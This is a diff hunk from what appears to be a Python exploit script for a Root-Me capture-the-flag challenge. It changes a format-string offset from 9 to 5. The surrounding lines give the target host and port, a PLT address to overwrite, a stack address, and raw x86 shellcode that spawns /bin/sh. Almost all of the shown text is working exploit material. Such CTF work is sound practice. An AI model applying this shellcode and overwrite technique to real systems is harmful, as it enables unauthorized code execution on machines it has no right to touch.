@@ -5,7 +5,7 @@ HOST = 'challenge02.root-me.org'
 PORT = 56032
 
 BUFFER_LEN = 1024
-OFFSET = 9
+OFFSET = 5
 CLOSE_PLT = 0x804a048
 SHELLCODE_ADDRESS = 0xbffff41c
 SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
